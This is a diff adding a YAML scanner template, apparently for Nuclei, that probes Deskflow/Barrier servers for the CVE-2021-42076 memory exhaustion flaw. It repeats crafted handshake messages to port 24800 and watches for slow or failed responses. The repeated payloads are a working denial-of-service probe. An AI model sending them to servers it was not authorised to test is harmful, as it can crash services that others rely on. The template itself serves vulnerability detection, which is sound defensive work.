@@ -1,0 +1,61 @@
+id: cve-2021-42076-barrier
+info:
+  name: "Deskflow Memory Exhaustion Vulnerability"
+  author: Denizhan Dakılır
+  severity: medium
+  description: |
+    A potential memory exhaustion vulnerability might exist in Deskflow versions before 1.18.
+    An attacker can cause memory exhaustion in the Deskflow server component by sending
+    specially crafted long TCP messages. This template attempts to test for memory
+    exhaustion by sending large payloads while monitoring server response.
+    
+    The test includes multiple indicators to differentiate between actual memory
+    exhaustion and other performance-related issues:
+    - Memory-specific error messages
+    - Connection reset patterns
+    - Gradual performance degradation
+    - System resource exhaustion signals
+  reference:
+    - https://nvd.nist.gov/vuln/detail/CVE-2021-42076
+    - https://github.com/debauchee/barrier/releases/tag/v2.3.4
+    - http://www.openwall.com/lists/oss-security/2021/11/02/4
+  tags: cve,CVE-2021-42076,barrier,deskflow,memory
+  classification:
+    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H
+    cvss-score: 7.5
+    cve-id: CVE-2021-42076
+
+network:
+  - inputs:
+      - data: |
+          CL:Unnamed
+          HANDSHAKE:1
+      - data: |
+          {{repeat("HANDSHAKE:1CL:desktop\n", 1024)}}
+      - data: |
+          {{repeat("HANDSHAKE:1CL:workstation\n", 1024)}}
+    host:
+      - "tls://{{Hostname}}"
+    port: 24800
+    read-size: 4096
+    matchers-condition: and
+    matchers:
+      - type: binary
+        part: response
+        binary:
+          - "434C3A"
+          - "48414E445348414B453A"
+        condition: and
+      - type: dsl
+        condition: or
+        dsl:
+          - 'response_time >= 5 && contains(response, "bad_alloc")'  
+          - 'response_time >= 5 && contains(response, "allocation failed")'  
+          - 'response == "" && response_time >= 3'
+          - 'response_time >= 8'
+      - type: dsl
+        name: "gradual-degradation"
+        condition: and
+        dsl:
+          - 'response_time_1 < response_time_2'
+          - 'response_time_2 >= 2 * response_time_1'
